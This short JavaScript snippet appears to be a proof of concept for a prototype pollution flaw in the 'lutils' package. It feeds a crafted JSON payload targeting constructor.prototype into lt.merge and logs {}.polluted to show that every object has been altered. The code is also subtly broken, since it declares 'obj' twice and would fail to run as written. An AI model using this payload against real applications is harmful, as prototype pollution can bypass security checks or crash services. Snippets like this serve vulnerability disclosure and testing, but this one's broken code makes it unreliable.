var obj = {};
obj.__proto__.polluted = undefined;
Object.defineProperty(obj, '__proto__', {
    value: obj.__proto__,
    writable: true,
    enumerable: true,
    configurable: true
});
const lt = require('lutils');
let obj = {};
console.log({}.polluted);
let EVIL_JSON = JSON.parse('{"constructor": {"prototype": {"polluted":"yes"}}}');
lt.merge(obj, EVIL_JSON);
console.log({}.polluted);